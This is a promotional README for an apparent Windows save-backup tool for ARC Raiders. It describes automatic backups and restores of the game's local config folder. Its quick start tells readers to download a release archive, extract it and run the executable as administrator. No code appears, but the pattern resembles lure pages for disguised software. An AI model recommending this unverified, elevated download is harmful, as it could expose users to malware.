# ARC Raiders Save Manager

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Local save file backup utility for ARC Raiders — protects settings and local configuration before updates or crashes.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/platecrawlerinflate/arc-raiders-save-manager-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Local save backup for ARC Raiders |
| **Who it's for** | Players who don't want to lose settings to a crash |
| **What it solves** | Local config loss after updates, no built-in backup |
| **How it works** | Copies local `%LOCALAPPDATA%\PioneerGame\Saved\` before each launch |

---

## 🔥 Why This Exists

ARC Raiders stores progress server-side, but local files still matter. Graphics settings, keybinds, and local preferences live in `%LOCALAPPDATA%\PioneerGame\Saved\`. A crash or a bad patch can corrupt those files, and there's no built-in way to roll back.

This utility copies that folder before every session. No memory access. No anti-cheat interaction. No in-game advantage. Just a safety net for your local config.

---

## 🧩 What It Does

### Auto Backup
- Copies local save and config files before launch
- Keeps the last 10 backups by default
- Works with Steam and Epic installations

### One-Click Restore
- Browse timestamped backups
- Restore any previous state with one click

### Update Protection
- Creates an extra backup before game patches
- Keeps update backups separate from regular ones

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Game** | ARC Raiders (Steam/Epic) | Latest patch |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `ArcSaveManager.exe` as administrator
4. **Select** your save folder (auto-detected)
5. **Enable** auto-backup
6. **Play** — backups happen automatically before each launch

---

## ❓ FAQ

**Does this modify the game or interact with anti-cheat?**
No — it only copies local files. It does not read game memory, inject code, or interact with Denuvo/Anybrain.

**Will I get banned?**
This utility does not provide any in-game advantage. It only backs up local configuration. However, Embark's policy is strict: any third-party tool that affects gameplay is banned. This tool does not affect gameplay. Use at your own discretion.

**Where are the saves stored?**
`%LOCALAPPDATA%\PioneerGame\Saved\`. The utility auto-detects this path.

**Does this backup my online progress?**
No — progress is server-side. This only backs up local settings and `.sav` files.

**How do I uninstall?**
Delete the utility folder. No registry entries or system changes are made.

---

## 🗺️ Roadmap

- [ ] Cloud backup integration
- [ ] Config diff viewer
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/platecrawlerinflate/arc-raiders-save-manager-2026/releases/tag/1.0.0)

**Version 1.0.0** — Save Protection · Local Backup · MIT

</div>
